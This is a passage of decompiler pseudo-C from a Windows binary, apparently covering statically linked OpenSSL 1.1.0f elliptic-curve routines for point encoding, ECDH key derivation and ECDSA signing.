  __int64 v17; // r8
  unsigned int (__fastcall *v18)(__int64 *, __int64 *, __int64, int *); // r10
  int v19; // eax
  __int64 v20; // r8
  unsigned int (__fastcall *v21)(__int64 *, __int64 *, __int64, int *); // r10
  int v22; // eax
  BOOL v23; // eax
  __int64 v24; // rdx
  int v25; // eax
  __int64 v26; // [rsp+30h] [rbp-38h]
  BOOL v28; // [rsp+90h] [rbp+28h]

  v5 = 0;
  v26 = 0i64;
  sub_140023B90();
  v9 = a5;
  if ( a5 || (result = (int *)sub_140027CD0(), v26 = (__int64)result, (v9 = result) != 0i64) )
  {
    v28 = a4 != 0;
    sub_140027D40(v9);
    v11 = sub_140027C40(v9);
    v12 = sub_140027C40(v9);
    v13 = sub_140027C40(v9);
    v14 = sub_140027C40(v9);
    if ( !v14 || !(unsigned int)sub_1400798F0((__int64)v13, a3, a1[8], v9) )
      goto LABEL_42;
    if ( *(_QWORD *)(*a1 + 296) )
    {
      if ( !(unsigned int)sub_1400797D0((__int64)v12, a3, a1[8], v9) )
        goto LABEL_42;
      v15 = sub_140079710((__int64)v11, (__int64)v12, a3, a1[8], v9);
    }
    else
    {
      if ( !(*(unsigned int (__fastcall **)(__int64 *, __int64 *, __int64, int *))(*a1 + 272))(a1, v12, a3, v9) )
        goto LABEL_42;
      v15 = (*(__int64 (__fastcall **)(__int64 *, __int64 *, __int64 *, __int64, int *))(*a1 + 264))(
              a1,
              v11,
              v12,
              a3,
              v9);
    }
    if ( v15 )
    {
      if ( *((_DWORD *)a1 + 28) )
      {
        if ( !(unsigned int)sub_1400795A0((__int64)v12, (__int64)v13, (__int64 *)a1[8])
          || !(unsigned int)sub_140079530(v12, (__int64)v12, (__int64)v13, (__int64 *)a1[8]) )
        {
          goto LABEL_42;
        }
        v16 = sub_140079890((__int64)v11, (__int64)v11, (__int64)v12, a1[8]);
      }
      else
      {
        v17 = a1[12];
        v18 = *(unsigned int (__fastcall **)(__int64 *, __int64 *, __int64, int *))(*a1 + 296);
        if ( v18 )
        {
          if ( !v18(a1, v12, v17, v9) )
            goto LABEL_42;
          v19 = sub_140079710((__int64)v12, (__int64)v12, (__int64)v13, a1[8], v9);
        }
        else
        {
          v19 = (*(__int64 (__fastcall **)(__int64 *, __int64 *, __int64, _QWORD *, int *))(*a1 + 264))(
                  a1,
                  v12,
                  v17,
                  v13,
                  v9);
        }
        if ( !v19 )
          goto LABEL_42;
        v16 = sub_140079530(v11, (__int64)v11, (__int64)v12, (__int64 *)a1[8]);
      }
      if ( v16 )
      {
        v20 = a1[13];
        v21 = *(unsigned int (__fastcall **)(__int64 *, __int64 *, __int64, int *))(*a1 + 296);
        if ( v21 )
        {
          if ( !v21(a1, v12, v20, v9) )
            goto LABEL_42;
          v20 = (__int64)v12;
        }
        if ( (unsigned int)sub_140079530(v11, (__int64)v11, v20, (__int64 *)a1[8]) )
        {
          if ( sub_140079C00(v14, (__int64)v11, a1[8], v9) )
          {
            if ( v28 == sub_1400270F0((__int64)v14) )
              goto LABEL_38;
            v23 = sub_140027160((__int64)v14);
            v24 = a1[8];
            if ( v23 )
            {
              v25 = sub_140079970((__int64)v13, v24, v9);
              if ( v25 != -2 )
              {
                if ( v25 == 1 )
                  sub_140024610(16, 169, 109, (__int64)&unk_1400F6A80, 130);
                else
                  sub_140024610(16, 169, 110, (__int64)&unk_1400F6A80, 136);
              }
              goto LABEL_42;
            }
            if ( (unsigned int)sub_140041C70((__int64)v14, v24, (__int64)v14) )
            {
LABEL_38:
              if ( v28 == sub_1400270F0((__int64)v14) )
              {
                if ( (unsigned int)sub_1400228F0((__int64)a1, a2) )
                  v5 = 1;
              }
              else
              {
                sub_140024610(16, 169, 68, (__int64)&unk_1400F6A80, 144);
              }
            }
          }
          else
          {
            v22 = sub_1400244B0();
            if ( (v22 & 0xFF000000) == 50331648 && (v22 & 0xFFF) == 111 )
            {
              sub_140023B90();
              sub_140024610(16, 169, 110, (__int64)&unk_1400F6A80, 113);
            }
            else
            {
              sub_140024610(16, 169, 3, (__int64)&unk_1400F6A80, 116);
            }
          }
        }
      }
    }
LABEL_42:
    sub_140027B60((__int64)v9);
    sub_140027BE0(v26);
    return (int *)v5;
  }
  return result;
}

//----- (00000001400451D0) ----------------------------------------------------
__int64 __fastcall sub_1400451D0(__int64 a1, _QWORD *a2, _BYTE *a3, __int64 a4, int *a5)
{
  int v5; // eax
  int *v6; // rbp
  int v10; // r15d
  int v11; // ebx
  __int64 v12; // r14
  __int64 v13; // rax
  int *v14; // rdi
  __int64 *v15; // r12
  __int64 *v16; // r13
  unsigned int v17; // eax
  _QWORD *v18; // [rsp+30h] [rbp-48h]
  unsigned int v21; // [rsp+98h] [rbp+20h]

  v6 = 0i64;
  v21 = 0;
  if ( !a4 )
  {
    sub_140024610(v5 - 80, v5 + 64, v5 + 4, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 261);
    return 0i64;
  }
  v10 = *a3 & 1;
  v11 = *a3 & 0xFE;
  switch ( v11 )
  {
    case 0:
      goto LABEL_9;
    case 2:
      break;
    case 4:
LABEL_9:
      if ( (*a3 & 1) != 0 )
      {
        sub_140024610(16, 160, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 274);
        return 0i64;
      }
      break;
    case 6:
      break;
    default:
      sub_140024610(16, 160, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 270);
      return 0i64;
  }
  if ( v11 )
  {
    v12 = (int)(sub_140021B10(a1) + 7) / 8;
    v13 = v12 + 1;
    if ( v11 != 2 )
      v13 = 2 * v12 + 1;
    if ( a4 != v13 )
    {
      sub_140024610(16, 160, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 293);
      return 0i64;
    }
    v14 = a5;
    if ( !a5 )
    {
      v6 = (int *)sub_140027CD0();
      v14 = v6;
      if ( !v6 )
        return 0i64;
    }
    sub_140027D40(v14);
    v15 = sub_140027C40(v14);
    v16 = sub_140027C40(v14);
    v18 = sub_140027C40(v14);
    if ( v18 && sub_140026840(a3 + 1, v12, (__int64)v15) )
    {
      if ( (int)sub_140027600(v15, *(__int64 **)(a1 + 64)) >= 0 )
      {
        sub_140024610(16, 160, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 313);
        goto LABEL_40;
      }
      if ( v11 == 2 )
      {
        v17 = (unsigned int)sub_140028F50((__int64 *)a1, a2, (__int64)v15, v10, v14);
        goto LABEL_38;
      }
      if ( sub_140026840(&a3[v12 + 1], v12, (__int64)v16) )
      {
        if ( (int)sub_140027600(v16, *(__int64 **)(a1 + 64)) < 0 )
        {
          if ( v11 == 6 )
          {
            if ( !(*(unsigned int (__fastcall **)(__int64, _QWORD *, __int64 *, __int64 *, int *))(*(_QWORD *)a1 + 280i64))(
                    a1,
                    v18,
                    v16,
                    v15,
                    v14) )
              goto LABEL_40;
            if ( v10 != sub_1400270F0((__int64)v18) )
            {
              sub_140024610(16, 160, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 332);
              goto LABEL_40;
            }
          }
          v17 = sub_1400227F0(a1, a2);
LABEL_38:
          if ( v17 )
            v21 = 1;
          goto LABEL_40;
        }
        sub_140024610(16, 160, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 325);
      }
    }
LABEL_40:
    sub_140027B60((__int64)v14);
    sub_140027BE0((__int64)v6);
    return v21;
  }
  if ( a4 != 1 )
  {
    sub_140024610(16, 160, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 280);
    return 0i64;
  }
  return sub_1400229F0(a1, a2);
}
// 14004525F: conditional instruction was optimized away because ebx.4 is in (==2|==6)
// 140045210: variable 'v5' is possibly undefined

//----- (00000001400454C0) ----------------------------------------------------
__int64 __fastcall sub_1400454C0(__int64 a1, _QWORD *a2, int a3, _BYTE *a4, unsigned __int64 a5, int *a6)
{
  int *v6; // r15
  __int64 v11; // kr08_8
  unsigned __int64 v12; // r12
  __int64 v13; // rax
  unsigned __int64 v14; // r13
  int *v15; // rbp
  __int64 v16; // rbx
  unsigned __int64 v17; // rdx
  __int64 v18; // rbx
  unsigned __int64 v19; // rdx
  _BYTE *v20; // rdi
  _QWORD *v21; // [rsp+30h] [rbp-48h]
  _QWORD *v22; // [rsp+38h] [rbp-40h]
  _QWORD *v23; // [rsp+40h] [rbp-38h]

  v6 = 0i64;
  if ( ((a3 - 2) & 0xFFFFFFF9) != 0 || a3 == 8 )
  {
    sub_140024610(16, 161, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 140);
    goto LABEL_41;
  }
  if ( !(unsigned int)sub_140022480(a1, a2) )
  {
    v11 = (int)(sub_140021B10(a1) + 7);
    v12 = ((BYTE4(v11) & 7) + (int)v11) >> 3;
    v13 = v12;
    if ( a3 != 2 )
      v13 = 2 * v12;
    v14 = v13 + 1;
    if ( !a4 )
      goto LABEL_39;
    if ( a5 < v14 )
    {
      sub_140024610(16, 161, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 165);
LABEL_41:
      sub_140027BE0((__int64)v6);
      return 0i64;
    }
    v15 = a6;
    if ( !a6 )
    {
      v6 = (int *)sub_140027CD0();
      v15 = v6;
      if ( !v6 )
        return 0i64;
    }
    sub_140027D40(v15);
    v22 = sub_140027C40(v15);
    v21 = sub_140027C40(v15);
    v23 = sub_140027C40(v15);
    if ( v23 && (unsigned int)sub_140022300(a1, a2) )
    {
      *a4 = a3;
      if ( a3 == 4 || sub_140027160((__int64)v22) )
      {
LABEL_23:
        v16 = 1i64;
        v17 = v12 - (int)(sub_140027260((__int64)v22) + 7) / 8;
        if ( v17 > v12 )
        {
          sub_140024610(16, 161, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 198);
          goto LABEL_25;
        }
        if ( v17 )
        {
          v16 = v17 + 1;
          memset(a4 + 1, 0, v17);
        }
        v18 = (int)sub_1400269C0((__int64)v22, &a4[v16]) + v16;
        if ( v18 != v12 + 1 )
        {
          sub_140024610(16, 161, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 208);
          goto LABEL_25;
        }
        if ( ((a3 - 4) & 0xFFFFFFFD) == 0 )
        {
          v19 = v12 - (int)(sub_140027260((__int64)v21) + 7) / 8;
          if ( v19 > v12 )
          {
            sub_140024610(16, 161, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 216);
            goto LABEL_25;
          }
          if ( v19 )
          {
            v20 = &a4[v18];
            v18 += v19;
            memset(v20, 0, v19);
          }
          v18 += (int)sub_1400269C0((__int64)v21, &a4[v18]);
        }
        if ( v18 != v14 )
        {
          sub_140024610(16, 161, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 228);
          goto LABEL_25;
        }
        sub_140027B60((__int64)v15);
LABEL_39:
        sub_140027BE0((__int64)v6);
        return v14;
      }
      if ( (*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 280i64))(
             a1,
             v23,
             v21,
             v22,
             v15) )
      {
        if ( sub_1400270F0((__int64)v23) )
          ++*a4;
        goto LABEL_23;
      }
    }
LABEL_25:
    sub_140027B60((__int64)v15);
    goto LABEL_41;
  }
  if ( !a4 )
    return 1i64;
  if ( a5 )
  {
    *a4 = 0;
    return 1i64;
  }
  sub_140024610(16, 161, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 148);
  return 0i64;
}
// 1400454C0: using guessed type unsigned __int64 arg_20;

//----- (00000001400457E0) ----------------------------------------------------
int *__fastcall sub_1400457E0(__int64 a1, _QWORD *a2, __int64 a3, int a4, int *a5)
{
  unsigned int v5; // esi
  __int64 v7; // r15
  int *v9; // rbx
  int *result; // rax
  _QWORD *v11; // rbp
  _QWORD *v12; // r14
  _QWORD *v13; // r12
  int v14; // eax
  int v15; // eax
  int v16; // ebp
  _QWORD *v17; // [rsp+30h] [rbp-48h]
  int v20; // [rsp+A0h] [rbp+28h]

  v5 = 0;
  v7 = 0i64;
  sub_140023B90();
  v9 = a5;
  if ( a5 || (result = (int *)sub_140027CD0(), v7 = (__int64)result, (v9 = result) != 0i64) )
  {
    v20 = a4 != 0;
    sub_140027D40(v9);
    v11 = sub_140027C40(v9);
    v12 = sub_140027C40(v9);
    v13 = sub_140027C40(v9);
    v17 = sub_140027C40(v9);
    if ( !v17 || !(unsigned int)sub_14007A500((__int64)v12, a3, (_DWORD *)(a1 + 72)) )
      goto LABEL_22;
    if ( sub_140027160((__int64)v12) )
    {
      v14 = sub_14007B850((__int64)v13, *(_QWORD *)(a1 + 104), (_DWORD *)(a1 + 72), v9);
    }
    else
    {
      if ( !(*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 272i64))(
              a1,
              v11,
              v12,
              v9)
        || !(*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD, _QWORD *, int *))(*(_QWORD *)a1 + 280i64))(
              a1,
              v11,
              *(_QWORD *)(a1 + 104),
              v11,
              v9)
        || !(unsigned int)sub_14007A380((__int64)v11, *(_QWORD *)(a1 + 96), (__int64)v11)
        || !(unsigned int)sub_14007A380((__int64)v11, (__int64)v12, (__int64)v11) )
      {
        goto LABEL_22;
      }
      if ( !(unsigned int)sub_14007B2C0((__int64)v17, (__int64)v11, (int *)(a1 + 72), v9) )
      {
        v15 = sub_1400244B0();
        if ( (v15 & 0xFF000000) == 50331648 && (v15 & 0xFFF) == 116 )
        {
          sub_140023B90();
          sub_140024610(16, 164, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 96);
        }
        else
        {
          sub_140024610(16, 164, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_oct.c", 99);
        }
        goto LABEL_22;
      }
      v16 = sub_1400270F0((__int64)v17);
      if ( !(*(unsigned int (__fastcall **)(__int64, _QWORD *, _QWORD *, _QWORD *, int *))(*(_QWORD *)a1 + 264i64))(
              a1,
              v13,
              v12,
              v17,
              v9) )
        goto LABEL_22;
      if ( v16 == v20 )
        goto LABEL_20;
      v14 = sub_14007A380((__int64)v13, (__int64)v13, (__int64)v12);
    }
    if ( v14 )
    {
LABEL_20:
      if ( (unsigned int)sub_1400227F0(a1, a2) )
        v5 = 1;
    }
LABEL_22:
    sub_140027B60((__int64)v9);
    sub_140027BE0(v7);
    return (int *)v5;
  }
  return result;
}

//----- (0000000140045A70) ----------------------------------------------------
__int64 __fastcall sub_140045A70(_QWORD *a1, size_t *a2, __int64 a3, std::ios_base *a4)
{
  unsigned int v4; // r15d
  _BYTE *v5; // rbp
  _QWORD *v6; // r14
  int *v8; // rax
  int *v9; // rdi
  _QWORD *v10; // rsi
  __int64 v11; // r12
  __int64 *v12; // rbx
  _QWORD *v13; // rax
  __int64 v14; // rax
  size_t v15; // r12
  size_t v16; // r13
  _BYTE *v17; // rax

  v4 = 0;
  v5 = 0i64;
  v6 = 0i64;
  v8 = (int *)sub_140027CD0();
  v9 = v8;
  if ( v8 )
  {
    sub_140027D40(v8);
    v10 = sub_140027C40(v9);
    sub_140027C40(v9);
    v11 = std::ios_base::width(a4);
    if ( !v11 )
    {
      sub_140024610(16, 257, 154, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 72);
      goto LABEL_27;
    }
    v12 = (__int64 *)sub_14001C740((__int64)a4);
    if ( (sub_14001C790((__int64)a4) & 0x1000) != 0 )
    {
      if ( !sub_140021A10((__int64)v12, (__int64)v10)
        || !(unsigned int)sub_14006E5B0((__int64)v10, (__int64)v10, v11, v9) )
      {
        sub_140024610(16, 257, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 81);
        goto LABEL_27;
      }
      v11 = (__int64)v10;
    }
    v13 = sub_140022670(v12);
    v6 = v13;
    if ( !v13 )
    {
      sub_140024610(16, 257, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 88);
      goto LABEL_27;
    }
    if ( !(unsigned int)sub_140022600((__FrameHandler3::TryBlockMap *)v12, v13, 0i64, a3, v11, (__int64)v9) )
    {
      sub_140024610(16, 257, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 93);
      goto LABEL_27;
    }
    v14 = sub_140021BD0((__int64)v12);
    if ( (unsigned int)sub_140022000(v14) == 406 )
    {
      if ( !(unsigned int)sub_140022380((__int64)v12, v6) )
      {
        sub_140024610(16, 257, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 100);
        goto LABEL_27;
      }
    }
    else if ( !(unsigned int)sub_140022300((__int64)v12, v6) )
    {
      sub_140024610(16, 257, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 107);
      goto LABEL_27;
    }
    v15 = (int)(sub_140021B10((__int64)v12) + 7) / 8;
    v16 = (int)(sub_140027260((__int64)v10) + 7) / 8;
    if ( v16 <= v15 )
    {
      v17 = sub_14001D8E0(v15);
      v5 = v17;
      if ( v17 )
      {
        memset(v17, 0, v15 - v16);
        if ( v16 == (int)sub_1400269C0((__int64)v10, &v5[v15 - v16]) )
        {
          *a1 = v5;
          v5 = 0i64;
          v4 = 1;
          *a2 = v15;
        }
        else
        {
          sub_140024610(16, 257, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 126);
        }
      }
      else
      {
        sub_140024610(16, 257, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 120);
      }
    }
    else
    {
      sub_140024610(16, 257, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 116);
    }
  }
LABEL_27:
  sub_1400222C0(v6);
  if ( v9 )
    sub_140027B60((__int64)v9);
  sub_140027BE0((__int64)v9);
  sub_14001D930(v5);
  return v4;
}

//----- (0000000140045D90) ----------------------------------------------------
__int64 __fastcall sub_140045D90(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 (*v4)(void); // rax

  v4 = *(__int64 (**)(void))(**(_QWORD **)(a4 + 24) + 376i64);
  if ( v4 )
    return v4();
  sub_140024610(16, 247, 160, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdh_ossl.c", 40);
  return 0i64;
}

//----- (0000000140045DE0) ----------------------------------------------------
__int64 __fastcall sub_140045DE0(std::ios_base *a1, int *a2, __int64 **a3, __int64 **a4, char *a5, int a6)
{
  unsigned int v6; // esi
  void *v9; // rbx
  __int64 *v10; // r15
  int *v12; // rbp
  __int64 *v13; // rdi
  __int64 *v14; // rax
  __int64 *v15; // r12
  __int64 *jumpbuf_sp; // rsi
  __int64 v17; // rax
  int v18; // ebx
  __int64 v19; // rax
  __int64 v20; // rax
  int v21; // [rsp+20h] [rbp-68h]
  __int64 *v22; // [rsp+30h] [rbp-58h]
  _QWORD *v23; // [rsp+90h] [rbp+8h]

  v6 = 0;
  v9 = 0i64;
  if ( !a1 || (v10 = (__int64 *)sub_14001C740((__int64)a1)) == 0i64 )
  {
    sub_140024610(16, 248, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 46);
    return 0i64;
  }
  if ( !sub_14001C360((__int64)a1) )
  {
    sub_140024610(16, 248, 159, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 51);
    return 0i64;
  }
  if ( a2 )
  {
    v12 = a2;
  }
  else
  {
    v12 = (int *)sub_140027CD0();
    if ( !v12 )
    {
      sub_140024610(16, 248, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 57);
      return 0i64;
    }
  }
  v13 = (__int64 *)sub_140027200();
  v22 = (__int64 *)sub_140027200();
  v14 = (__int64 *)sub_140027200();
  v15 = v14;
  if ( !v13 || !v22 || !v14 )
  {
    sub_140024610(16, 248, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 67);
    goto LABEL_21;
  }
  v23 = sub_140022670(v10);
  v9 = v23;
  if ( !v23 )
  {
    sub_140024610(16, 248, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 71);
LABEL_21:
    sub_140026A10(v13);
    sub_140026A10(v22);
    goto LABEL_22;
  }
  jumpbuf_sp = (__int64 *)_except_get_jumpbuf_sp(v10);
  if ( !jumpbuf_sp )
  {
    sub_140024610(16, 248, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 76);
    goto LABEL_20;
  }
  while ( 1 )
  {
    if ( a5 )
    {
      v17 = std::ios_base::width(a1);
      if ( !(unsigned int)sub_140028040((__int64)v13, (__int64)jumpbuf_sp, v17, a5, a6, v12) )
      {
        sub_140024610(16, 248, 158, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 88);
LABEL_19:
        v9 = v23;
        goto LABEL_20;
      }
    }
    else if ( !(unsigned int)sub_140028310((__int64)v13, (__int64)jumpbuf_sp) )
    {
      sub_140024610(16, 248, 158, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 94);
      goto LABEL_19;
    }
    if ( !sub_140027160((__int64)v13) )
    {
      if ( !(unsigned int)sub_140041A10((__int64)v13, (__int64)v13, (__int64)jumpbuf_sp) )
        goto LABEL_19;
      v18 = sub_140027260((__int64)jumpbuf_sp);
      if ( (int)sub_140027260((__int64)v13) <= v18
        && !(unsigned int)sub_140041A10((__int64)v13, (__int64)v13, (__int64)jumpbuf_sp) )
      {
        goto LABEL_19;
      }
      v9 = v23;
      if ( !(unsigned int)sub_140022600(
                            (__FrameHandler3::TryBlockMap *)v10,
                            v23,
                            (__int64)v13,
                            0i64,
                            0i64,
                            (__int64)v12) )
      {
        sub_140024610(16, 248, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 113);
LABEL_20:
        v6 = 0;
        goto LABEL_21;
      }
      v19 = sub_140021BD0((__int64)v10);
      if ( (unsigned int)sub_140022000(v19) == 406 )
      {
        if ( !(unsigned int)sub_140022380((__int64)v10, v23) )
        {
          sub_140024610(16, 248, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 120);
          goto LABEL_20;
        }
      }
      else if ( !(unsigned int)sub_140022300((__int64)v10, v23) )
      {
        sub_140024610(16, 248, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 130);
        goto LABEL_20;
      }
      if ( !(unsigned int)sub_1400798F0((__int64)v22, (__int64)v15, (__int64)jumpbuf_sp, v12) )
      {
        v21 = 136;
        goto LABEL_40;
      }
      if ( !sub_140027160((__int64)v22) )
        break;
    }
  }
  if ( sub_140021B60((__int64)v10) )
  {
    if ( !(unsigned int)sub_140027560((__int64)v15, 2i64) )
    {
      v21 = 149;
LABEL_40:
      sub_140024610(16, 248, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", v21);
      goto LABEL_20;
    }
    if ( !(unsigned int)sub_140079840((__int64)v15, (__int64)jumpbuf_sp, (__int64)v15, (__int64)jumpbuf_sp, v12) )
    {
      v21 = 153;
      goto LABEL_40;
    }
    sub_140027530((__int64)v15, 4);
    v20 = sub_140021B60((__int64)v10);
    if ( !(unsigned int)sub_14007C360((__int64)v13, v13, (__int64)v15, (unsigned __int64)jumpbuf_sp, v12, v20) )
    {
      v21 = 159;
      goto LABEL_40;
    }
  }
  else if ( !sub_14006FDD0(v13, (__int64)v13, jumpbuf_sp, v12) )
  {
    v21 = 164;
    goto LABEL_40;
  }
  sub_140026A10(*a4);
  sub_140026A10(*a3);
  *a4 = v22;
  v6 = 1;
  *a3 = v13;
LABEL_22:
  if ( v12 != a2 )
    sub_140027BE0((__int64)v12);
  sub_1400222C0(v9);
  sub_140026A10(v15);
  return v6;
}
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);

//----- (00000001400462F0) ----------------------------------------------------
__int64 sub_1400462F0(__int64 a1, __int64 a2, unsigned int a3, ...)
{
  unsigned int *v5; // rax
  __int64 **v6; // rbx
  int v8; // eax
  unsigned __int8 *v9; // [rsp+58h] [rbp+20h] BYREF
  va_list va; // [rsp+58h] [rbp+20h]
  _DWORD *v11; // [rsp+60h] [rbp+28h]
  __int64 v12; // [rsp+68h] [rbp+30h]
  __int64 v13; // [rsp+70h] [rbp+38h]
  __int64 v14; // [rsp+78h] [rbp+40h]
  va_list va1; // [rsp+80h] [rbp+48h] BYREF

  va_start(va1, a3);
  va_start(va, a3);
  v9 = va_arg(va1, unsigned __int8 *);
  v11 = va_arg(va1, _DWORD *);
  v12 = va_arg(va1, _QWORD);
  v13 = va_arg(va1, _QWORD);
  v14 = va_arg(va1, _QWORD);
  sub_140025570(a2, a3);
  v5 = (unsigned int *)sub_140065140(a2, a3, v12, v13, v14);
  v6 = (__int64 **)v5;
  if ( v5 )
  {
    v8 = sub_140066B30(v5, (unsigned __int8 **)va);
    *v11 = v8;
    sub_140065320(v6);
    return 1i64;
  }
  else
  {
    *v11 = 0;
    return 0i64;
  }
}

//----- (0000000140046380) ----------------------------------------------------
__int64 __fastcall sub_140046380(std::ios_base *a1, int *a2, __int64 **a3, __int64 **a4)
{
  return sub_140045DE0(a1, a2, a3, a4, 0i64, 0);
}

//----- (00000001400463B0) ----------------------------------------------------
__int64 **__fastcall sub_1400463B0(char *a1, int a2, __int64 *a3, __int64 a4, std::ios_base *a5)
{
  __int64 *v7; // r12
  int *v8; // r13
  __int64 v9; // rbx
  __int64 v10; // rax
  __int64 **v11; // rdi
  __int64 *v12; // rax
  __int64 *v13; // rsi
  __int64 jumpbuf_sp; // rax
  __int64 *v15; // r15
  int v16; // ebx
  int v17; // eax
  __int16 v18; // r8
  int v19; // ecx
  __int64 *v20; // rbx
  int v22; // [rsp+20h] [rbp-68h]
  __int64 *v23; // [rsp+30h] [rbp-58h]
  __int64 *v24; // [rsp+38h] [rbp-50h]
  __int64 *v25; // [rsp+40h] [rbp-48h] BYREF
  __int64 v26; // [rsp+48h] [rbp-40h]

  v25 = 0i64;
  v23 = 0i64;
  v24 = 0i64;
  v7 = 0i64;
  v8 = 0i64;
  v9 = sub_14001C740((__int64)a5);
  v10 = std::ios_base::width(a5);
  v26 = v10;
  if ( !v9 || !v10 )
  {
    sub_140024610(16, 249, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 210);
    return 0i64;
  }
  if ( !sub_14001C360((__int64)a5) )
  {
    sub_140024610(16, 249, 159, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 215);
    return 0i64;
  }
  v11 = (__int64 **)sub_140065370();
  if ( !v11 )
  {
    sub_140024610(16, 249, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 221);
    return 0i64;
  }
  *v11 = (__int64 *)sub_140027200();
  v12 = (__int64 *)sub_140027200();
  v13 = v12;
  v11[1] = v12;
  if ( !*v11 || !v12 )
  {
    v22 = 227;
    goto LABEL_41;
  }
  v8 = (int *)sub_140027CD0();
  if ( !v8 || (v24 = (__int64 *)sub_140027200()) == 0i64 || (v23 = (__int64 *)sub_140027200()) == 0i64 )
  {
    v22 = 234;
    goto LABEL_41;
  }
  jumpbuf_sp = _except_get_jumpbuf_sp(v9);
  v15 = (__int64 *)jumpbuf_sp;
  if ( !jumpbuf_sp )
  {
    sub_140024610(16, 249, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 240);
    goto LABEL_43;
  }
  v16 = sub_140027260(jumpbuf_sp);
  v17 = a2;
  if ( 8 * a2 > v16 )
  {
    v17 = (v16 + 7) / 8;
    a2 = v17;
  }
  if ( sub_140026840(a1, v17, (__int64)v23) )
  {
    v19 = a2;
    if ( 8 * a2 <= v16 )
      goto LABEL_22;
    if ( !(unsigned int)sub_140047090((__int64)v23, (__int64)v23, 8 - (v16 & 7u)) )
    {
      v22 = 255;
      v18 = 3;
      goto LABEL_42;
    }
    while ( 2 )
    {
      v19 = a2;
LABEL_22:
      if ( !a3 || !a4 )
      {
        do
        {
          if ( !(unsigned int)sub_140045DE0(a5, v8, &v25, v11, a1, v19) )
          {
            sub_140024610(16, 249, 42, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecdsa_ossl.c", 261);
            v7 = v25;
            goto LABEL_43;
          }
          v7 = v25;
          v20 = v25;
LABEL_28:
          if ( !(unsigned int)sub_140079710((__int64)v24, v26, (__int64)*v11, (__int64)v15, v8) )
          {
            v22 = 274;
            v18 = 3;
            goto LABEL_42;
          }
          if ( !(unsigned int)sub_140079530(v13, (__int64)v24, (__int64)v23, v15) )
          {
            v22 = 278;
            v18 = 3;
            goto LABEL_42;
          }
          if ( !(unsigned int)sub_140079710((__int64)v13, (__int64)v13, (__int64)v20, (__int64)v15, v8) )
          {
            v22 = 282;
            v18 = 3;
            goto LABEL_42;
          }
          if ( !sub_140027160((__int64)v13) )
            goto LABEL_44;
          v19 = a2;
        }
        while ( !a3 );
        if ( !a4 )
          continue;
        v22 = 291;
        v18 = 157;
